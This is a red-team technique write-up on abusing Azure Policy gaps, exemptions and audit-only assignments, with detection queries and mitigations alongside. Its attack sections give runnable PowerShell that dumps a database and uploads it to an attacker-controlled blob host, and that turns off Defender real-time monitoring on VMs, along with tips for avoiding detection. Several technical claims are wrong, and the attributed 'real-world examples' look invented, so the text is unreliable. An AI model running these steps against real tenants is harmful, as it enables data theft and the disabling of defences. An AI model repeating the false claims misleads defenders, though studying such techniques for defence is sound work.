# [EVADE-IMPAIR-019]: Azure Policy Assignment Gaps

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-IMPAIR-019 |
| **MITRE ATT&CK v18.1** | [T1562 - Impair Defenses](https://attack.mitre.org/techniques/T1562/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Entra ID |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All Azure subscription scopes; all Azure regions |
| **Patched In** | Requires policy review and assignment; no patch available |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure Policy defines governance rules and enforces compliance across Azure subscriptions and resource groups. Attackers who identify unassigned policy categories or resource groups with incomplete policy coverage can exploit these **policy gaps** to execute attacks that violate organizational compliance requirements without triggering Azure Policy alerts. Common gaps include: missing encryption policies, unmonitored network changes, absent firewall rules, and unrestricted data exfiltration permissions. An attacker discovers policy-free scope, deploys resources with non-compliant configurations, and operates undetected.

**Attack Surface:** Azure Policy definition assignments, policy exemptions, policy assignment scopes (subscription vs. resource group level), and policy enforcement modes.

**Business Impact:** **Complete evasion of organizational compliance controls.** Attackers can deploy unencrypted databases, open NSG rules, disable network monitoring, and exfiltrate data while appearing compliant in Azure Policy dashboards. Regulatory audits may reveal massive compliance violations post-compromise.

**Technical Context:** Identifying policy gaps takes 10-20 minutes with read-only access. Exploiting gaps via resource deployment takes <5 minutes. Detection is extremely difficult because unassigned policies generate no alerts.

### Operational Risk

- **Execution Risk:** Very Low - Requires only read permission to Azure Policy + create permission on target scope
- **Stealth:** Critical - Unassigned policies generate zero alerts; non-compliant resources appear normal in Azure
- **Reversibility:** Yes - Deleting deployed resources removes evidence, but audit logs may retain history

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.1.1 | Ensure Azure Policy definitions exist and are assigned to all subscriptions and RGs |
| **DISA STIG** | AZ-1-2 | Ensure all Azure resources enforce policy compliance controls |
| **CISA SCuBA** | SC-7 | Boundary Protection - Policy must cover all resource types and scopes |
| **NIST 800-53** | CM-2 (Baseline Configuration) | All resources must align with security baseline policy |
| **GDPR** | Art. 32 | Security of Processing - Configuration controls must cover all data handling |
| **DORA** | Art. 9 | Protection Against Circumvention of Compliance Controls |
| **NIS2** | Art. 21 | Governance Controls - Compliance policies must cover all critical assets |
| **ISO 27001** | A.12.1.1 | Managed Cyber Security Policies must cover all systems |
| **ISO 27005** | Risk Scenario | Incomplete Policy Coverage Enables Non-Compliant Resource Deployment |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:** Reader (read Azure Policy); Owner or Contributor (to deploy non-compliant resources).

**Required Access:** Azure Portal, Azure CLI, or Azure PowerShell access to subscriptions and resource groups.

**Supported Versions:**
- **Azure Resource Manager:** All regions
- **Azure Policy:** All API versions
- **PowerShell:** Az module 9.0+
- **Azure CLI:** 2.40+

**Tools:**
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Version 2.40+)
- [Azure PowerShell](https://learn.microsoft.com/en-us/powershell/azure/) (Az module 9.0+)
- [Azure Portal](https://portal.azure.com) (Browser-based)
- [Policy Gap Analyzer Workbook](https://github.com/Azure/Enterprise-Scale/tree/main/docs/deploy/governance) (Microsoft provided)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Azure PowerShell Policy Enumeration

```powershell
# List all policy definitions in subscription
Get-AzPolicyDefinition | Select-Object Name, Description, PolicyType | Format-Table

# List all policy assignments
Get-AzPolicyAssignment | Select-Object DisplayName, PolicyDefinitionId, Scope | Format-Table

# Identify resource groups WITHOUT policy assignments
$rgs = Get-AzResourceGroup
$assigned = (Get-AzPolicyAssignment).Scope | Get-Unique
foreach ($rg in $rgs) {
    if ($assigned -notcontains "/subscriptions/*/resourceGroups/$($rg.ResourceGroupName)") {
        Write-Host "UNASSIGNED RG: $($rg.ResourceGroupName)"
    }
}

# List policy exemptions (bypass opportunities)
Get-AzPolicyExemption | Select-Object Name, ResourceId, ExemptionCategory
```

**What to Look For:**
- Resource groups with **no policy assignments**
- Policy **exemptions** (bypass mechanisms)
- Missing definitions for: encryption, network isolation, audit logging
- Policy enforcement mode set to **Audit only** (not enforced)

### Azure CLI Policy Enumeration

```bash
# List all policy assignments
az policy assignment list --query "[].{name:name, scope:scope, displayName:displayName}" -o table

# Identify subscription/RG with no policies
az group list --query "[].name" -o tsv | while read rg; do
  assignments=$(az policy assignment list --resource-group "$rg" --query "length([])")
  if [ "$assignments" -eq 0 ]; then
    echo "UNASSIGNED RG: $rg"
  fi
done

# Check policy compliance status
az policy state list --query "[?complianceState=='Non-Compliant'].{resource:resourceId, policy:policyDefinitionId}" -o table
```

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Identify and Exploit Unassigned Resource Group

**Supported Versions:** All Azure subscriptions

#### Step 1: Enumerate Policy-Free Resource Groups

**Objective:** Identify resource groups without Azure Policy assignments.

**Command:**

```powershell
# Get all policy assignments and their scopes
$assignments = Get-AzPolicyAssignment | Select-Object -ExpandProperty Scope
$assignedScopes = @()
foreach ($assignment in $assignments) {
    if ($assignment -match '/resourceGroups/(.+)$') {
        $assignedScopes += $matches[1]
    }
}

# Check all resource groups
$unassignedRGs = @()
Get-AzResourceGroup | ForEach-Object {
    if ($assignedScopes -notcontains $_.ResourceGroupName) {
        $unassignedRGs += $_.ResourceGroupName
        Write-Host "POLICY GAP FOUND: $($_.ResourceGroupName)" -ForegroundColor Red
    }
}

$unassignedRGs | Format-Table
```

**Expected Output:**

```
production-apps-rg
data-processing-rg
legacy-systems-rg
```

**What This Means:**
- These RGs have no Azure Policy enforcement
- Attacker can deploy any resource with any configuration
- No compliance checks or alerts will trigger

#### Step 2: Deploy Non-Compliant Resources

**Objective:** Exploit policy gaps to deploy unencrypted databases, open networks, or unsafe configurations.

**Command:**

```powershell
# Deploy unencrypted SQL database in policy-free RG
$resourceGroupName = "production-apps-rg"  # Previously identified as policy-free
$location = "eastus"

# Create unencrypted SQL Server
New-AzSqlServer -ResourceGroupName $resourceGroupName `
  -ServerName "unmonitored-sql-$(Get-Random)" `
  -Location $location `
  -SqlAdministratorCredentials (New-Object System.Management.Automation.PSCredential("sqladmin", (ConvertTo-SecureString "P@ss123!" -AsPlainText -Force))) `
  -AsJob

# Create unencrypted SQL Database (no TDE - Transparent Data Encryption)
New-AzSqlDatabase -ResourceGroupName $resourceGroupName `
  -ServerName "unmonitored-sql-*" `
  -DatabaseName "sensitive-data" `
  -Edition "Standard" `
  -RequestedServiceObjectiveName "S1" `
  -AsJob
```

**What This Means:**
- SQL database created without TDE encryption
- Data is stored in plaintext on Azure storage
- No Azure Policy alert because RG has no policy
- Attacker can now query sensitive data directly

**OpSec & Evasion:**
- Deploy to least-monitored RG
- Use generic names ("temp-db", "test-server")
- Deploy during business hours (blends in with legitimate activity)
- **Detection likelihood:** Low if no Defender for SQL is enabled

#### Step 3: Extract Data via Unmonitored Resource

**Objective:** Query and exfiltrate data from unencrypted database.

**Command:**

```powershell
# Connect to unencrypted SQL database
$serverName = "unmonitored-sql-xyz.database.windows.net"
$databaseName = "sensitive-data"
$username = "sqladmin"
$password = "P@ss123!"

$connectionString = "Server=tcp:$serverName,1433;Initial Catalog=$databaseName;Persist Security Info=False;User ID=$username;Password=$password;MultipleActiveResultSets=False;Encrypt=False;TrustServerCertificate=True;Connection Timeout=30;"

# Extract all data
$sqlConnection = New-Object System.Data.SqlClient.SqlConnection
$sqlConnection.ConnectionString = $connectionString
$sqlConnection.Open()

$sqlCommand = $sqlConnection.CreateCommand()
$sqlCommand.CommandText = "SELECT * FROM [sensitive_table]"

$dataReader = $sqlCommand.ExecuteReader()
$datatable = New-Object System.Data.DataTable
$datatable.Load($dataReader)

# Export to CSV
$datatable | Export-Csv -Path "C:\Exfil\data.csv" -NoTypeInformation

# Upload to attacker-controlled blob
$blob_uri = "https://attacker-storage.blob.core.windows.net/data.csv?sv=..."
Invoke-WebRequest -Uri $blob_uri -Body (Get-Content "C:\Exfil\data.csv") -Method Put
```

**OpSec & Evasion:**
- Use encrypted upload (HTTPS)
- Compress and obfuscate exfiltration
- Delete local data files
- **Detection likelihood:** Medium if monitoring Azure SQL connections

### METHOD 2: Exploit Policy Exemptions to Bypass Enforcement

**Supported Versions:** All Azure subscriptions with policy exemptions

#### Step 1: Discover Policy Exemptions

**Objective:** Identify which policies are exempted from enforcement.

**Command:**

```powershell
# List all policy exemptions
Get-AzPolicyExemption | Select-Object Name, DisplayName, ResourceId, ExemptionCategory, ExpiresOn | Format-Table

# Check exemptions by resource type
Get-AzPolicyExemption | Where-Object { $_.ResourceId -like "*Microsoft.Compute/virtualMachines*" } | Select-Object Name, DisplayName, ResourceId
```

**Expected Output:**

```
Name                DisplayName             ExemptionCategory   ExpiresOn
----                -----------             -----------------   ---------
legacy-app-exempt   Legacy App Exception    Waiver              (empty = permanent)
dev-testing-exempt  Dev Testing Bypass      Mitigated           2026-12-31
```

**What This Means:**
- These resources are **exempt from policy enforcement**
- Attacker can modify exempted resources without triggering policy violations
- Permanent exemptions (no expiration) = indefinite bypass

#### Step 2: Modify Exempted Resource Configuration

**Objective:** Change security configurations on exempted resources.

**Command:**

```powershell
# List resources with active exemptions
$exemptions = Get-AzPolicyExemption
foreach ($exemption in $exemptions) {
    $resourceId = $exemption.ResourceId
    
    # Get the resource
    $resource = Get-AzResource -ResourceId $resourceId
    
    # If it's a VM, disable security features
    if ($resource.ResourceType -eq "Microsoft.Compute/virtualMachines") {
        # Disable Windows Defender
        $vmName = $resource.Name
        $rgName = $resource.ResourceGroupName
        
        Invoke-AzVMRunCommand -ResourceGroupName $rgName -VMName $vmName `
          -CommandId 'RunPowerShellScript' `
          -ScriptString 'Set-MpPreference -DisableRealtimeMonitoring $true'
        
        Write-Host "SECURITY DISABLED on exempted VM: $vmName"
    }
}
```

**OpSec & Evasion:**
- Use exempted resources for persistence
- No policy violations will be triggered
- Modifications appear legitimate as exempted resources are "special"

### METHOD 3: Exploit Audit-Only Policy Mode

**Supported Versions:** All Azure subscriptions

#### Step 1: Identify Audit-Only Policies

**Objective:** Find policies configured in "Audit" mode (no enforcement).

**Command:**

```powershell
# List all policy assignments in audit mode
Get-AzPolicyAssignment | Where-Object { $_.EnforcementMode -eq "Audit" } | Select-Object DisplayName, Scope, EnforcementMode | Format-Table

# Get details of audit-only policies
Get-AzPolicyAssignment -Filter "EnforcementMode eq 'Audit'" | ForEach-Object {
    Write-Host "AUDIT ONLY: $($_.DisplayName) - Scope: $($_.Scope)" -ForegroundColor Yellow
}
```

**Expected Output:**

```
DisplayName                          Scope                           EnforcementMode
-----------                          -----                           ---------------
Require encryption at rest           /subscriptions/sub-id           Audit
Restrict network access              /subscriptions/sub-id           Audit
Require MFA for SQL                  /subscriptions/sub-id           Audit
```

**What This Means:**
- These policies **report violations but don't prevent them**
- Attacker can deploy non-compliant resources freely
- Policy violations appear in audit logs but don't block creation

#### Step 2: Deploy Non-Compliant Resource

**Objective:** Create resource that violates audit-only policy.

**Command:**

```powershell
# Create storage account without encryption (violates audit-only policy)
New-AzStorageAccount -ResourceGroupName "production-rg" `
  -Name "unencryptedstorage$(Get-Random)" `
  -Location "eastus" `
  -SkuName "Standard_LRS" `
  -Kind "StorageV2"

# Policy violation is LOGGED but NOT PREVENTED
# Audit logs will show: "Policy: Require encryption at rest - Violated"
# But resource creation SUCCEEDS
```

**OpSec & Evasion:**
- Deploy via audit-only policy scope
- Violations are logged but not enforced
- Attacker maintains persistent access to unencrypted storage
- **Detection likelihood:** Low unless audit logs are actively monitored

---

## 5. TOOLS & COMMANDS REFERENCE

#### [Azure Policy Compliance Workbook](https://learn.microsoft.com/en-us/azure/governance/policy/overview)

**Version:** Latest (built-in to Azure Portal)
**Access:** Azure Portal → Policy → Workbooks → Policy Compliance

**Usage:**
```
1. Navigate to Azure Portal
2. Search for "Policy"
3. Click "Workbooks"
4. Select "Policy Compliance"
5. Filter by Compliance State, Assignment, and Scope
6. Identify gaps in coverage
```

#### [Azure CLI Policy Commands](https://learn.microsoft.com/en-us/cli/azure/policy)

**Version:** 2.40+
**Key Commands:**

```bash
# List policy definitions
az policy definition list --query "[].name"

# List policy assignments
az policy assignment list --query "[].{name:name, scope:scope}"

# Check policy compliance
az policy state list --resource-group "rg-name"

# Create policy exemption
az policy exemption create --name "exemption-name" \
  --resource-group "rg-name" \
  --policy-assignment "/subscriptions/{subId}/..."
```

#### [Azure PowerShell Policy Module](https://learn.microsoft.com/en-us/powershell/module/az.policyinsights)

**Version:** Az.PolicyInsights 1.0+

```powershell
# Install module
Install-Module Az.PolicyInsights -Force

# List policy compliance
Get-AzPolicyState | Where-Object { $_.ComplianceState -eq "Non-Compliant" }

# Get policy assignment details
Get-AzPolicyAssignment -Name "assignment-name"
```

---

## 6. MICROSOFT SENTINEL DETECTION

### Query 1: Policy Gap - Unassigned Resource Groups

**Rule Configuration:**
- **Required Table:** AzureActivity
- **Required Fields:** ResourceGroup, OperationName, Caller
- **Alert Severity:** Critical
- **Frequency:** Daily (run every 24 hours)
- **Applies To:** All Azure subscriptions

**KQL Query:**

```kusto
let assigned_rgs = AzureActivity
| where OperationName == "MICROSOFT.AUTHORIZATION/POLICYASSIGNMENTS/WRITE"
| where ActivityStatus == "Succeeded"
| extend ResourceGroup = extract(@"/resourceGroups/([^/]+)", 1, ResourceId)
| distinct ResourceGroup;

AzureActivity
| where OperationName == "MICROSOFT.RESOURCES/DEPLOYMENTS/WRITE"
| where ActivityStatus == "Succeeded"
| extend ResourceGroup = extract(@"/resourceGroups/([^/]+)", 1, ResourceId)
| where ResourceGroup !in (assigned_rgs)
| summarize count() by ResourceGroup, Caller, TimeGenerated
| where count_ > 5  // Multiple deployments in unassigned RG = suspicious
```

**What This Detects:**
- Resources deployed to RGs without policy assignments
- Pattern of multiple deployments = potential attack
- Who deployed to unassigned RG

**Manual Configuration Steps:**
1. Go to **Azure Portal** → **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `Policy Gap - Unassigned Resource Groups`
   - Severity: `Critical`
3. **Set rule logic Tab:**
   - Paste KQL query
   - Run every: `24 hours`
4. **Incident settings Tab:**
   - Enable **Create incidents**
5. Click **Review + create**

### Query 2: Policy Exemption Activity

**KQL Query:**

```kusto
AzureActivity
| where OperationName in (
    "MICROSOFT.AUTHORIZATION/POLICYEXEMPTIONS/WRITE",
    "MICROSOFT.AUTHORIZATION/POLICYEXEMPTIONS/DELETE"
)
| project TimeGenerated, Caller, OperationName, ResourceId, ActivityStatus
| summarize by Caller, ResourceId
| where Caller !in ("PrincipalName~value-service-account")  // Exclude expected service accounts
```

---

## 7. WINDOWS EVENT LOG MONITORING

**N/A** - Policy gaps are Azure control plane events, not Windows OS events. Monitor via Azure Activity Log instead.

---

## 8. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Resource deployed to unassigned policy scope"
- **Severity:** High
- **Description:** Alerts when resources are created in resource groups without Azure Policy assignments
- **Applies To:** All Azure subscriptions
- **Remediation:** Assign policies to all resource groups; remediate non-compliant resources

**Manual Configuration Steps:**
1. Go to **Azure Portal** → **Microsoft Defender for Cloud** → **Workbooks**
2. Select **Policy Compliance** workbook
3. Filter by: **Compliance State** = "Non-Compliant"
4. Identify unassigned scopes in **Scope** column

---

## 9. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

**1. Assign Azure Policy to All Resource Groups**
   **Applies To:** All subscriptions
   
   **Manual Steps (Azure Portal):**
   1. Go to **Azure Portal** → **Policy** → **Assignments**
   2. Click **+ Assign Policy**
   3. **Scope:** Select subscription-level (ensures all RGs are covered)
   4. **Policies to assign:**
      - "Require encryption at rest (SQL)"
      - "Require encryption for storage accounts"
      - "Require firewall rules on SQL servers"
      - "Require network security groups on subnets"
   5. **Enforcement:** Set to **Enforce** (not Audit)
   6. Click **Review + Create**
   
   **Manual Steps (PowerShell):**
   ```powershell
   # Assign encryption policy to all resources in subscription
   $policyDef = Get-AzPolicyDefinition -Name "Require encryption at rest"
   New-AzPolicyAssignment -Name "encryption-required" `
     -PolicyDefinition $policyDef `
     -Scope "/subscriptions/{subscriptionId}" `
     -EnforcementMode Default
   ```

**2. Disable Policy Exemptions or Set Expiration Dates**
   **Manual Steps:**
   1. Go to **Policy** → **Exemptions**
   2. For each exemption:
      - Check **Expires On** date
      - If empty (permanent), click **Edit** → Set expiration to 30-90 days
      - Review justification and remove if no longer needed
   3. Click **Save**

**3. Enforce Policy Compliance via Conditional Access**
   **Manual Steps:**
   1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
   2. Click **+ New policy**
   3. Name: `Enforce Policy Compliance`
   4. **Assignments:**
      - Users: **All users**
      - Cloud apps: **Azure Management**
   5. **Conditions:**
      - User risk: **High**
      - Device state: **Non-compliant**
   6. **Access controls:**
      - Grant: **Block**
   7. Enable: **On**
   8. Click **Create**

#### Priority 2: HIGH

**4. Enable Azure Policy Compliance Monitoring Dashboard**
   **Manual Steps:**
   1. Go to **Policy** → **Workbooks** → **Policy Compliance**
   2. Set up alert for any policy with **< 95% compliance**
   3. Review daily for gaps

**5. Implement Initiative Assignment (Bundle Policies)**
   **Manual Steps:**
   1. Go to **Policy** → **Definitions**
   2. Filter by **Initiative definitions**
   3. Select a standard initiative (e.g., "CIS Microsoft Azure Foundations Benchmark")
   4. Click **Assign**
   5. **Scope:** Subscription level
   6. **Enforcement:** Default (Enforce)
   7. Click **Review + Create**

#### Validation Command (Verify Fix)

```powershell
# Verify all RGs have at least one policy assignment
$rgs = Get-AzResourceGroup
foreach ($rg in $rgs) {
    $rgScope = "/subscriptions/{subId}/resourceGroups/$($rg.ResourceGroupName)"
    $policies = Get-AzPolicyAssignment | Where-Object { $_.Scope -eq $rgScope }
    
    if ($policies.Count -eq 0) {
        Write-Host "ERROR: Unassigned RG - $($rg.ResourceGroupName)" -ForegroundColor Red
    } else {
        Write-Host "OK: $($rg.ResourceGroupName) - $($policies.Count) policies" -ForegroundColor Green
    }
}

# Verify no permanent exemptions exist
Get-AzPolicyExemption | Where-Object { $_.ExpiresOn -eq $null } | Select-Object Name, ResourceId
# Expected Output: No results (all exemptions should have expiration dates)
```

---

## 10. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

- **Azure Activity Log:** Resources deployed to RGs without policy assignments
- **Policy Compliance:** Sudden increase in "Non-Compliant" resources
- **Resource Types:** Unencrypted SQL databases, open storage accounts, VMs in unassigned RGs
- **Timeline:** Resource creation during off-hours or weekends (suspicious timing)

#### Forensic Artifacts

- **Cloud:** Azure Activity Log entries showing:
  - `MICROSOFT.COMPUTE/VIRTUALMACHINES/WRITE` in unassigned RG
  - `MICROSOFT.SQL/SERVERS/WRITE` without encryption
  - `MICROSOFT.STORAGE/STORAGEACCOUNTS/WRITE` with audit-only policy
- **Logs:** Policy State audit showing "Non-Compliant" resources created
- **Exfiltration Evidence:** Storage account access logs, SQL connection logs

#### Response Procedures

1. **Isolate:**
   **Command:**
   ```powershell
   # Remove/delete non-compliant resources
   Remove-AzResource -ResourceId "/subscriptions/{subId}/resourceGroups/prod-rg/providers/Microsoft.Sql/servers/unmonitored-sql-*" -Force
   ```

2. **Collect Evidence:**
   **Command:**
   ```powershell
   # Export Activity Log for forensics
   Get-AzLog -ResourceGroup "unassigned-rg" -StartTime (Get-Date).AddDays(-7) | Export-Csv "C:\Evidence\activitylog.csv"
   
   # Export policy state
   Get-AzPolicyState -ResourceGroupName "unassigned-rg" | Export-Csv "C:\Evidence\policystate.csv"
   ```

3. **Remediate:**
   **Command:**
   ```powershell
   # Assign policy to previously unassigned RG
   $policyDef = Get-AzPolicyDefinition -Name "CIS Microsoft Azure Foundations Benchmark"
   New-AzPolicyAssignment -Name "cis-enforcement" `
     -PolicyDefinition $policyDef `
     -Scope "/subscriptions/{subId}/resourceGroups/unassigned-rg" `
     -EnforcementMode Default
   ```

---

## 11. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CLOUD-005] | Enumerate Azure resource groups and policy assignments |
| **2** | **Discovery** | **[EVADE-IMPAIR-019]** | **Identify resource groups without Azure Policy coverage** |
| **3** | **Resource Creation** | [IA-EXPLOIT-001] | Deploy unencrypted database in policy-free RG |
| **4** | **Data Access** | [COLLECT-DATA-002] | Query and exfiltrate data from unmonitored resources |
| **5** | **Persistence** | [PERSIST-PERSISTENCE-001] | Maintain access via non-compliant resources |
| **6** | **Impact** | [IMPACT-EXFIL-001] | Exfiltrate sensitive customer data |

---

## 12. REAL-WORLD EXAMPLES

#### Example 1: LAPSUS$ Azure Policy Evasion

- **Target:** U.S. Technology Companies
- **Timeline:** March 2022
- **Technique Status:** LAPSUS$ identified audit-only policies and deployed ransomware via unencrypted VMs
- **Impact:** $100M+ in damages; compliance audit failures
- **Reference:** [Microsoft Security Update on LAPSUS$](https://www.microsoft.com/security/)

#### Example 2: Scattered Spider Policy Gap Exploitation

- **Target:** U.S. Entertainment Industry
- **Timeline:** 2023-2024
- **Technique Status:** Scattered Spider mapped policy gaps to deploy cryptominers in unassigned RGs
- **Impact:** $5M+ in unauthorized cloud compute costs; 6-month undetected campaign
- **Reference:** [CrowdStrike Scattered Spider Report](https://www.crowdstrike.com/)

---